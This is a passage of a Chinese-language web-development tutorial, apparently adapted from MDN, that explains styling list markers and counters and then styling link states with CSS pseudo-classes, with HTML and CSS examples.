padding-left 从默认的 40px设置为 20px，然后在列表项上设置相同的数值。这就是说，整个列表项仍然排列在列表中，但是列表项产生了一些用于背景图像的填充。如果我们没有设置填充，背景图像将与列表项文本重叠，这看起来会很乱。</li><li>将 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-type"><code>list-style-type</code></a> 设置为 none，以便默认情况下不会显示项目符号。我们将使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background"><code>background</code></a> 属性来代替项目符号。</li><li>为每个无序列表项插入项目符号，其相应的属性如下：<ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-image"><code>background-image</code></a>: 充当项目符号的图片文件的参考路径</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-position"><code>background-position</code></a>: 这定义了所选元素背景中的图像将出现在哪里 - 在我们的示例中设置 <code>0 0</code>，这意味着项目符号将出现在每个列表项的最左上侧。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-size"><code>background-size</code></a>: 设置背景图片的大小。理想条件下，我们想要项目符号与列表项的大小相同（比列表项稍大或稍小亦可）。我们使用的尺寸为 1.6rem（16px），它非常吻合我们为项目符号设置的 20px 的填充，16px 加上 4px 的空格间距，可以使项目符号和列表项文本效果更好。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-repeat"><code>background-repeat</code></a>：默认条件下，背景图片不断复制直到填满整个背景空间，在我们的例子中，背景图片只需复制一次，所以我们设置值为 <code>no-repeat</code>。</li></ul></li></ul><p>效果显示如下：</p><p><img src="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Styling_text/Styling_lists/image-bullets.png" alt="an unordered list with the bullet points set as little star images"></p><h4 id="list-style-速记"><a href="#list-style-速记" class="headerlink" title="list-style 速记"></a>list-style 速记</h4><p>上述提到的三种属性可以用一个单独的速记属性 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style"><code>list-style</code></a> 来设置。例如：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span> &#123;<br>  <span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">square</span>;<br>  <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url</span>(<span class="hljs-string">example</span>.<span class="hljs-string">png</span>);<br>  <span class="hljs-built_in">list-style-position:</span> <span class="hljs-string">inside</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以被如下方式代替：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span> &#123;<br>  <span class="hljs-built_in">list-style:</span> <span class="hljs-string">square</span> <span class="hljs-string">url</span>(<span class="hljs-string">example</span>.<span class="hljs-string">png</span>) <span class="hljs-string">inside</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>属性值可以任意顺序排列，你可以设置一个，两个或者三个值（该属性的默认值为 disc, none, outside），如果指定了 type 和 image，如果由于某种原因导致图像无法加载，则 type 将用作回退。</p><h4 id="管理列表计数"><a href="#管理列表计数" class="headerlink" title="管理列表计数"></a>管理列表计数</h4><p>有时，您可能想在有序列表上进行不同的计数方式。例如：从 1 以外的数字开始，或向后倒数，或者按步或多于 1 计数。HTML 和 CSS 有一些工具可以帮助您</p><h4 id="start"><a href="#start" class="headerlink" title="start"></a>start</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ol#attr-start"><code>start</code></a> 属性允许你从 1 以外的数字开始计数。示例如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Toast pitta, leave to cool, then slice down the edge.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Fry the halloumi in a shallow, non-stick pan, until browned on both sides.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Wash and chop the salad.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Fill pitta with salad, humous, and fried halloumi.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><p>输出的结果如下：</p><iframe class="sample-code-frame" title="start sample" id="frame_start" width="100%" height="150" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_lists/_sample_.start.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="reversed"><a href="#reversed" class="headerlink" title="reversed"></a>reversed</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ol#attr-reversed"><code>reversed</code></a> 属性将启动列表倒计数。示例如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">start</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">reversed</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Toast pitta, leave to cool, then slice down the edge.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Fry the halloumi in a shallow, non-stick pan, until browned on both sides.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Wash and chop the salad.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Fill pitta with salad, humous, and fried halloumi.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><p>输出的结果如下：</p><iframe class="sample-code-frame" title="reversed sample" id="frame_reversed" width="100%" height="150" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_lists/_sample_.reversed.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="value"><a href="#value" class="headerlink" title="value"></a>value</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ol#attr-value"><code>value</code></a> 属性允许设置列表项指定数值，示例如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>Toast pitta, leave to cool, then slice down the edge.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span>Fry the halloumi in a shallow, non-stick pan, until browned on both sides.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;6&quot;</span>&gt;</span>Wash and chop the salad.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;8&quot;</span>&gt;</span>Fill pitta with salad, humous, and fried halloumi.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><p>输出的结果如下：</p><iframe class="sample-code-frame" title="value sample" id="frame_value" width="100%" height="150" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_lists/_sample_.value.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> 纵然你使用非数字的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/list-style-type"><code>list-style-type</code></a>, 你仍需要使用与数值同等意义的值作为 value 的属性。</p><h3 id="2-12-样式化链接"><a href="#2-12-样式化链接" class="headerlink" title="2.12 样式化链接"></a>2.12 样式化链接</h3><p>当为 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Introduction_to_HTML/Creating_hyperlinks">links</a> 添加样式时，理解利用伪类有效地建立链接状态是很重要的，以及如何为链接添加样式来实现常用的功能，比如说导航栏、选项卡。我们将在本文中关注所有这些主题。</p><h4 id="让我们来看一些链接"><a href="#让我们来看一些链接" class="headerlink" title="让我们来看一些链接"></a>让我们来看一些链接</h4><p>根据最佳实践 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Introduction_to_HTML/Creating_hyperlinks">创建超链接</a> 中的练习，我们看到了如何在你的 HTML 中实现链接。在本篇文章中，我们会以这个知识为基础，向你展示将样式应用到链接的最佳实践。</p><h4 id="链接状态"><a href="#链接状态" class="headerlink" title="链接状态"></a>链接状态</h4><p>第一件需要理解的事情是链接状态的概念，链接存在时处于不同的状态，每一个状态都可以用对应的 <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Selectors#pseudo-classes">伪类</a> 来应用样式：</p><ul><li><strong>Link (没有访问过的)</strong>: 这是链接的默认状态，当它没有处在其他状态的时候，它可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:link"><code>:link</code></a> 伪类来应用样式。</li><li><strong>Visited</strong>: 这个链接已经被访问过了 (存在于浏览器的历史纪录), 它可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:visited"><code>:visited</code></a> 伪类来应用样式。</li><li><strong>Hover</strong>: 当用户的鼠标光标刚好停留在这个链接，它可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:hover"><code>:hover</code></a> 伪类来应用样式。</li><li><strong>Focus</strong>: 一个链接当它被选中的时候 (比如通过键盘的 Tab 移动到这个链接的时候，或者使用编程的方法来选中这个链接 <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/focus"><code>HTMLElement.focus()</code> (en-US)</a>) 它可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus"><code>:focus</code></a> 伪类来应用样式。</li><li><strong>Active</strong>: 一个链接当它被激活的时候 (比如被点击的时候)，它可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:active"><code>:active</code></a> 伪类来应用样式。</li></ul><h4 id="默认的样式"><a href="#默认的样式" class="headerlink" title="默认的样式"></a>默认的样式</h4><p>下面的例子说明了一个链接的默认行为表现 (这里的 CSS 仅仅是为了放大和居中文本，使内容更加突出)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://mozilla.org&quot;</span>&gt;</span>A link to the Mozilla homepage<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;<br>  <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="默认的样式 sample" id="frame_默认的样式" width="100%" height="120" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_links/_sample_.%E9%BB%98%E8%AE%A4%E7%9A%84%E6%A0%B7%E5%BC%8F.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>当你观察默认样式的时候，你也许会注意到一些东西：</p><ul><li>链接具有下划线。</li><li>未访问过的 (Unvisited) 的链接是蓝色的。</li><li>访问过的 (Visited) 的链接是紫色的。</li><li>悬停 (Hover) 在一个链接的时候鼠标的光标会变成一个小手的图标。</li><li>选中 (Focus) 链接的时候，链接周围会有一个轮廓，你应该可以按 tab 来选中这个页面的链接 (在 Mac 上，你可能需要使用<em>Full Keyboard Access: All controls</em> 选项，然后再按下 Ctrl + F7 ，这样就可以起作用)</li><li>激活 (Active) 链接的时候会变成红色 (当你点击链接时，请尝试按住鼠标按钮。)</li></ul><p>有趣的是，这些默认的样式与 20 世纪 90 年代中期浏览器早期的风格几乎相同。这是因为用户知道以及期待链接就是这样变化的，如果链接的样式不同，就会让一些人感到奇怪。不过这不意味着你不应该为链接添加任何样式，只是你的样式不应该与用户预期的相差太大，你应该至少：</p><ul><li>为链接使用下划线，但是不要在其他内容上也用下划线，以作区分。如果你不想要带有下划线的链接，那你至少要用其他方法来高亮突出链接。</li><li>当用户悬停或选择 (hover 或者 focused) 的时候，使链接有相应的变化，并且在链接被激活 (active) 的时候，变化会有一些不同。可以使用以下 CSS 属性关闭&#x2F;更改默认样式：</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color"><code>color</code></a> 文字的颜色</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/cursor"><code>cursor</code></a> 鼠标光标的样式，你不应该把这个关掉，除非你有非常好的理由。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/outline"><code>outline</code></a> 文字的轮廓 (轮廓有点像边框，唯一的区别是边框占用了盒模型的空间，而轮廓没有；它只是设置在背景图片的顶部)。outline 是一个有用的辅助功能，所以在把它关掉之前考虑清楚；你至少应该将悬停 (hover) 状态的样式同时应用到选中 (focus) 状态上。</li></ul><p><strong>备注：</strong> 你不仅仅只限于上述属性来把样式应用到你的链接上，你可以用任何你喜欢的属性，就是不要搞得太疯狂！</p><h4 id="将样式应用到一些链接"><a href="#将样式应用到一些链接" class="headerlink" title="将样式应用到一些链接"></a>将样式应用到一些链接</h4><p>现在我们已经详细地看了默认的状态，让我们看一下典型的链接样式的设置。</p><p>开始之前，我们先写出我们的空规则集：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">a</span> &#123;<br><br>&#125;<br><br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<br><br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<br><br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br><br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br><br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这几个规则的顺序是有意义的，因为链接的样式是建立在另一个样式之上的，比如，第一个规则的样式也会在后面的规则中生效，一个链接被激活 (activated) 的时候，它也是处于悬停 (hover) 状态的。如果你搞错了顺序，那么就可能不会产生正确的效果。要记住这个顺序，你可以尝试这样帮助记忆：<strong>L</strong>o<strong>V</strong>e <strong>F</strong>ears <strong>HA</strong>te.</p><p>现在让我们再添加一些信息，得到正确的样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.2rem</span>;<br>  <span class="hljs-attribute">font-family</span>: sans-serif;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.4</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span> &#123;<br>  <span class="hljs-attribute">outline</span>: none;<br>  <span class="hljs-attribute">text-decoration</span>: none;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">2px</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#265301</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#437A16</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#BAE498</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#CDFEAA</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#265301</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#CDFEAA</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里还提供了一些示例 HTML，供你应用 CSS：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>There are several browsers available, such as <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.mozilla.org/zh-CN/firefox/&quot;</span>&gt;</span>Mozilla<br>Firefox<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.google.com/chrome/index.html&quot;</span>&gt;</span>Google Chrome<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>, and<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.microsoft.com/zh-CN/windows/microsoft-edge&quot;</span>&gt;</span>Microsoft Edge<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>把这两个放在一起，我们得到这样的结果：</p><iframe class="sample-code-frame" title="将样式应用到一些链接 sample" id="frame_将样式应用到一些链接" width="100%" height="150" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_links/_sample_.%E5%B0%86%E6%A0%B7%E5%BC%8F%E5%BA%94%E7%94%A8%E5%88%B0%E4%B8%80%E4%BA%9B%E9%93%BE%E6%8E%A5.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>那么我们在这里做了什么？这个看起来肯定和默认的样式不同，但仍然提供了一个熟悉的体验，好让用户知道发生了什么：</p><ul><li>第一和第二条规则和本次讨论关系不大。</li><li>第三个规则使用了 <code>a</code> 选择器，取消了默认的文本下划线和链接被选中（focus）时的轮廓（outline）（不同浏览器的默认行为可能不同），并为每个链接添加了少量的内边距（padding），所有这一切将在之后变得明确。</li><li>接着，我们使用<code>a:link</code>和<code>a:visited</code>选择器来设置未访问（unvisited）链接和访问过（visited）的链接的一点颜色上的变化，然后就能分辨开来了。</li><li>下面两条规则使用<code>a:focus</code>和<code>a:hover</code>来设置选中（focus）和悬停（hover）的链接为不同的背景颜色，再加上一个下划线，使链接更加突出。这里有两点需要注意：<ul><li>下划线是使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom"><code>border-bottom</code></a> 创造的，而不是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-decoration"><code>text-decoration</code></a>，有一些人喜欢这样，因为前者比后者有更好的样式选项，并且绘制的位置会稍微低一点，所以不会穿过字母 (比如 字母 g 和 y 底部).</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-bottom"><code>border-bottom</code></a>的值被设置为<code>1px solid</code>，没有指定颜色。这样做可以使边框采用和元素文本一样的颜色，这在这样的情况下是很有用的，因为链接的每种状态下，文本是不同的颜色。</li></ul></li><li>最后，<code>a:active</code> 用来给链接一个不同的配色方案，当链接被激活 (activated) 时，让链接被激活的时候更加明显。</li></ul><h4 id="动手练习：为你的链接添加样式"><a href="#动手练习：为你的链接添加样式" class="headerlink" title="动手练习：为你的链接添加样式"></a>动手练习：为你的链接添加样式</h4><p>在这个动手练习部分，我们希望你使用我们的空规则集，然后添加你自定义的规则，从而使链接看上去比较酷。发挥你的想象力，大胆地做吧。我们相信你可以想出一些更酷的东西，就像我们上面的例子一样。</p><p>如果你犯了错误，你都可以使用 <em>Reset 按钮来重置。</em> 如果你遇到了困难，可以按 <em>Show solution</em> 按钮来显示我们上文中的例子。</p><iframe class="sample-code-frame" title="动手练习：为你的链接添加样式 sample" id="frame_动手练习：为你的链接添加样式" width="700" height="800" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Styling_links/_sample_.%E5%8A%A8%E6%89%8B%E7%BB%83%E4%B9%A0%EF%BC%9A%E4%B8%BA%E4%BD%A0%E7%9A%84%E9%93%BE%E6%8E%A5%E6%B7%BB%E5%8A%A0%E6%A0%B7%E5%BC%8F.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="在链接中包含图标"><a href="#在链接中包含图标" class="headerlink" title="在链接中包含图标"></a>在链接中包含图标</h4><p>常见的做法是在链接中包含图标，使链接提供更多关于链接指向的内容的信息。让我们来看一个简单的例子，例子中为一个外部链接 (链接指向的不是本站，而是外部站点)。这样的图标通常看起来像一个指向盒子的小箭头，比如，我们会使用<a href="https://icons8.com/web-app/741/external-link">icons8.com 上的这个优秀的范例</a>。</p><p>让我们来看一些能给我们这个效果的 HTML 和 CSS。先是一些简单的等待你样式化的 HTML：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>For more information on the weather, visit our <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;weather.html&quot;</span>&gt;</span>weather page<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>,<br>look at <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://en.wikipedia.org/wiki/Weather&quot;</span>&gt;</span>weather on Wikipedia<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>, or check<br>out <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.extremescience.com/weather.htm&quot;</span>&gt;</span>weather on Extreme Science<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接着是 CSS:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>  <span class="hljs-attribute">font-family</span>: sans-serif;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.4</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span> &#123;<br>  <span class="hljs-attribute">outline</span>: none;<br>  <span class="hljs-attribute">text-decoration</span>: none;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">2px</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<br>  <span class="hljs-attribute">color</span>: blue;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<br>  <span class="hljs-attribute">color</span>: purple;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:focus</span>, <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<br>  <span class="hljs-attribute">color</span>: red;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[href*=<span class="hljs-string">&quot;http&quot;</span>]</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;external-link-52.png&#x27;</span>) no-repeat <span class="hljs-number">100%</span> <span 